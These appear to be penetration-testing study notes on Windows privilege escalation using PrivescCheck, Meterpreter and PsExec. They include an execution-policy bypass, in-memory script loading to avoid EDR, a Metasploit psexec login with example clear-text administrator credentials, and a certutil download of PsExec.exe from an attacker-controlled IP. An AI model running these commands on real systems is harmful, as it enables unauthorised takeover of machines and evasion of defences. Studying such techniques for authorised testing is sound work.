# Windows Privilege Escalation â€“ PrivescCheck & Post-Exploitation

## ğŸ” Identifying PrivEsc Vulnerabilities

- **Goal**: Find misconfigurations that allow local privilege escalation (LPE)
- **Common vectors**:
  - Unquoted service paths
  - Misconfigured service permissions
  - AlwaysInstallElevated registry keys
  - Insecure file/folder permissions
  - Token impersonation opportunities
  - **Clear-text credentials in registry**

> ğŸ’¡ **Why automate?** Manual enumeration is slow and error-prone â€” use scripts like **PrivescCheck**

---
## ğŸ› ï¸ PrivescCheck â€“ Basic Pentest Usage

### Step 1: Download & Transfer (In PS session - noisy)
- Get standalone script:  
  ```bash
  wget https://github.com/itm4n/PrivescCheck/raw/main/PrivescCheck.ps1
  ```
- Upload to target via HTTP/SMB

### Step 2: Execute Basic Scan
```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```
- `-ep bypass`: Bypasses PowerShell execution policy  
- `. .\script.ps1`: Dot-sourcing loads functions into current scope  
- Runs **only high-impact checks** (fast, low-noise)

âœ… **Output**: Clear list of exploitable issues (e.g., clear-text passwords, misconfigured services)

## <u>Or use it in meterpreter</u> :

In Metasploit, you have two distinct ways to run this, and the choice depends on how much "noise" you want to make and how stable your connection is.

### The Meterpreter Way (Recommended for Stealth)

Instead of spawning a new `powershell.exe` process (which is noisy and easily caught by EDR), you can load the PowerShell extension directly into Meterpreterâ€™s memory.

**How to do it:**

1. **Load the extension:**
```
meterpreter > load powershell
```
   
2. **Import the script from your Kali machine:** (This loads the script into the target's RAM without saving it to the hard drive).
```
meterpreter > powershell_import /home/kali/PrivescCheck.ps1
```

3. **Execute the function:**
```
meterpreter > powershell_execute "Invoke-PrivescCheck"
```

>If it times out, use the `sessions -t 120 -i <ID>` command before running `powershell_execute`.

---
## ğŸ’¥ Post-Exploitation: Using Found Credentials

### Scenario: Clear-Text Admin Password Found
- **Username**: `administrator`  
- **Password**: `hello_123321`

## ğŸš€ Method 1: Metasploit `psexec` (No Upload Needed)
```msf
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser administrator
set SMBPass hello_123321
exploit
```
âœ… **Result**:  
- Direct `NT AUTHORITY\SYSTEM` Meterpreter session  
- **No file upload required** â€” uses built-in SMB service execution

> ğŸ’¡ **How it works**:  
> Authenticates via SMB â†’ creates temporary service â†’ executes payload as SYSTEM

---
## ğŸ–¥ï¸ Method 2: Native `PsExec.exe` (Requires Upload)
### Do you need to upload it?
**Yes.** `PsExec.exe` is **not installed by default** on Windows.

### Steps:
1. **Upload PsExec** to target:
   ```cmd
   certutil -urlcache -f http://10.10.100.8/PsExec.exe PsExec.exe
   ```
2. **Execute as SYSTEM**:
   ```cmd
   .\PsExec.exe -i -s cmd.exe
   ```
   - `-i`: Interactive session  
   - `-s`: Run as `NT AUTHORITY\SYSTEM`

âœ… **Result**:  
- SYSTEM command prompt  
- Same privileges as Metasploit method

> âš ï¸ **Detection risk**:  
> - `PsExec.exe` is flagged by AV/EDR  
> - Leaves forensic artifacts (service creation, file write)

---
## ğŸ”‘ Key Comparison

| Method | Upload Required? | Detection Risk | Session Type |
|--------|------------------|----------------|--------------|
| **Metasploit `psexec`** | âŒ No | Medium (SMB service creation) | Meterpreter (SYSTEM) |
| **Native `PsExec.exe`** | âœ… Yes | High (file write + known tool) | CMD (SYSTEM) |

---
## ğŸ’¡ Pro Tips

- **Prefer Metasploit** â€” no file transfer, cleaner execution  
- **Verify admin rights first**:  
  ```cmd
  net localgroup administrators
  ```
- **If blocked by EDR**, use alternatives like `wmiexec` or `smbexec`

